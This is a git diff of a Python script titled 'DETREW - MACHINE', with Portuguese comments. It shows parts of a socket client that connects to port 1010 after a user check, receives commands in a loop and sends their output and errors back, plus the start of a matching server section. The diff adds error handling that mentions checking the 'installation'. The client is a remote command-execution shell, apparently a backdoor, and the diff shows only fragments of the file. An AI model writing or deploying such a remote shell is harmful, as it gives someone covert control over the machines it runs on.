@@ -1,5 +1,4 @@
 # DETREW - MACHINE
-
 import socket
 import ctypes,signal
 import os,getpass,time
@@ -173,14 +172,17 @@ else:
     # código para executar se o usuário estiver incorreto
     exit()
 
-#CLIENTE
-REMOTE_HOST = '' # sem nada e o localhost
-REMOTE_PORT = 1010 # porta da coneexão
-client = socket.socket()
-print("[-] Iniciando conexão...")
-client.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Coexão iniciada!")
- 
+#cliente
+REMOTE_HOST = ''
+REMOTE_PORT = 1010
+
+try:
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((REMOTE_HOST, REMOTE_PORT))
+except ConnectionRefusedError:
+    print("A conexão foi recusada. Verifique se a instalação foi feita corretamente.")
+    sys.exit(1)
+
 while True:
     print("[-] Aguardando comandos...")
     command = client.recv(1024)
@@ -191,8 +193,7 @@ while True:
     print("[-] mandando resposta...")
     client.send(output + output_error)
 
-# servidor socket
-
+#servidor socket
 HOST = '127.0.0.1'  # endereço do servidor (em branco significa que irá usar o endereço local)
 PORT = 1010  # porta de conexão
 
